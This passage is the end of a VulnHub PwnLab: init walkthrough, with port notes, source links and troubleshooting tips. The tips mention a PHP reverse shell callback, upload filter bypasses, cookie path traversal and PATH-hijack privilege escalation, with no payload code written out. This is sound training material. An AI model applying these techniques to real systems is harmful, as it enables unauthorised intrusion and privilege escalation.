- **⚠️ Verification note:** the card's port set (80, 111, 3306) is the operative one, but several scans in writeups also show one or two **extra high-numbered RPC `status` ports** (e.g. 49623, 58877, 60324) served by `rpcbind` on port 111. They are informational — no step of the chain needs them. Metadata (author Claor, released 1 Aug 2016, flag `/root/flag.txt`, OS Debian) is confirmed verbatim on the VulnHub entry.
- **Verified sources:** [abatchy](https://www.abatchy.com/2016/11/pwnlab-init-walkthrough-vulnhub) · [joenibe](https://joenibe.github.io/vulnhub/pwnlab/) · [IRONHACKERS](https://ironhackers.es/en/pwnlab-init-writeup-vulnhub/) · [reedphish](https://reedphish.wordpress.com/2016/09/17/pwnlab-init-walkthrough/) · [VulnHub entry](https://www.vulnhub.com/entry/pwnlab-init,158/) · [HackTricks — File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) · [CyberArri](https://cyberarri.com/2022/07/28/pwnlab-init/) · [flikk.blog](https://flikk.blog/2020/01/30/vulnhub-pwnlab-init/)

---

# Part H — If you get completely stuck

- Verify connectivity: `ping TARGET`, `ip -br a`.
- If `su` says "must be run from a terminal", you have no TTY — redo `pty.spawn`.
- Remember `../upload/` in the cookie (not just `upload/`).
- If your reverse shell never calls back, re-check IP and port in `shell.php` **with `grep`** (a wrong IP is the classic silent failure) and confirm your listener is up (`ss -tulnp | grep 4444`).
- If an upload is rejected, re-read the four checks from Step 5 — extension, client MIME, `getimagesize()` magic bytes, one-slash MIME — and fix the first one that fires.
- If `./msgmike` leaves you as `kane` with no shell, check `ls -la cat` (execute bit?) and `echo $PATH` (did your directory actually prepend?).
- Check [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Revert the snapshot and redo from memory.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 9 — CengBox: 1](09-cengbox-1.md) · next: [Machine 11 — Photographer: 1](11-photographer-1.md) · full writeup: [`labs/3-057-pwnlab-init`](../../labs/3-057-pwnlab-init/README.md)._
